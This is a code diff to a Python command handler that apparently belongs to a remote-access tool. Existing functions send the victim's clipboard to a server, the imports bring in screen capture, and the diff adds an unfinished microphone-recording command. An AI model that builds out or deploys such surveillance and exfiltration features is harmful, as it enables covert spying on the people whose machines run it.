@@ -1,10 +1,12 @@
 from socket_handlers import *
 from urllib.parse import unquote
-import os, base64, binascii, requests, ctypes, subprocess, psutil, json, platform, re, pyperclip
+import os, base64, binascii, requests, ctypes, subprocess, psutil, json, platform, re, pyperclip, tempfile
 from pathvalidate import sanitize_filename, sanitize_filepath
 from mss import mss
 from datetime import datetime
 from time import sleep
+import sounddevice as sd
+from scipy.io.wavfile import write
 
 
 def pwd(socket):
@@ -1025,3 +1027,21 @@ def send_clipboard(
 
     socket_send(socket, "Sending clipboard to server was not successfull")
     return False
+
+
+def mic_record(socket, command):
+    try:
+        parts = command.split()
+        if len(parts) < 3 or parts[0] != "mic_record" or parts[1] != "--duration":
+            socket_send(
+                socket, "Error: Invalid command format. Use 'mic_record --duration X'"
+            )
+            return False
+
+        duration = int(parts[2])
+        if duration <= 0:
+            socket_send(socket, "Error: Duration must be positive")
+            return False
+
+    except:
+        pass
